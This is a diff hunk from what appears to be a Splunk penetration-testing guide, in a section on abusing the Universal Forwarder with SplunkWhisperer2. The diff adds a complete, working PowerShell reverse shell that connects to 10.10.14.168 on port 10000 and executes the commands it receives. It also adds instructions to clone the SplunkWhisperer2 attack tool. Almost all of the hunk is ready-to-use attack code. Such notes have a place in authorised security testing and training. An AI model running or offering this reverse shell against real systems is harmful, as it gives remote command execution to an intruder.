@@ -184,6 +184,21 @@ curl -sk https://<target>:8089/services/data/inputs/script \
 
 # Method 4: Universal Forwarder Abuse (SplunkWhisperer2)
 ```powershell
+// shell.ps1
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.168', 10000);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+
+// Download SplunkWhisperer2
 git clone https://github.com/cnotin/SplunkWhisperer2
 cd SplunkWhisperer2
 
